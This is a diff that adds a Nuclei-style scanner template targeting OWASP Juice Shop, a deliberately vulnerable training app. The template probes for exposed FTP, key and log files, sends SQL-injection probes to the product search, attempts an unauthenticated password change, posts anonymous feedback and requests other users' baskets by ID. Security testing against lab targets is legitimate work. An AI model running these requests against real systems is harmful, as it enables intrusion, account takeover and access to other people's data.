@@ -1,0 +1,109 @@
+id: hunt3r-juice-shop-specific
+
+info:
+  name: Juice Shop Vulnerability Coverage
+  author: hunt3r
+  severity: high
+  description: Comprehensive checks for OWASP Juice Shop vulnerabilities including exposed APIs, admin access, sensitive data, and known challenges.
+  tags: juice-shop,exposure,auth-bypass,hunt3r
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ftp/"
+      - "{{BaseURL}}/ftp/legal.md"
+      - "{{BaseURL}}/ftp/quarantine/"
+      - "{{BaseURL}}/encryptionkeys/"
+      - "{{BaseURL}}/encryptionkeys/jwt.pub"
+      - "{{BaseURL}}/support/logs"
+      - "{{BaseURL}}/support/logs/access.log"
+      - "{{BaseURL}}/.well-known/security.txt"
+      - "{{BaseURL}}/api-docs"
+      - "{{BaseURL}}/rest/memories/"
+      - "{{BaseURL}}/socket.io/?EIO=4&transport=polling"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "Juice"
+          - "encryptionkeys"
+          - "jwt"
+          - "-----BEGIN"
+          - "logs"
+          - "socket"
+          - "swagger"
+          - "index of"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/products/search?q=))"
+      - "{{BaseURL}}/rest/products/search?q=%27"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "SQLITE_ERROR"
+          - "SyntaxError.*sqlite"
+          - "near.*syntax error"
+          - "SequelizeDatabaseError"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/user/change-password?new=hunter2&repeat=hunter2"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "Unauthorized"
+          - "token"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/Feedbacks/"
+
+    body: '{"comment":"Test feedback from Hunt3r","rating":5}'
+    headers:
+      Content-Type: "application/json"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [201]
+
+      - type: word
+        part: body
+        words:
+          - "\"id\""
+          - "Hunt3r"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/basket/1"
+      - "{{BaseURL}}/rest/basket/2"
+      - "{{BaseURL}}/rest/basket/3"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "\"Products\"\s*:"
+          - "\"UserId\"\s*:[0-9]+"
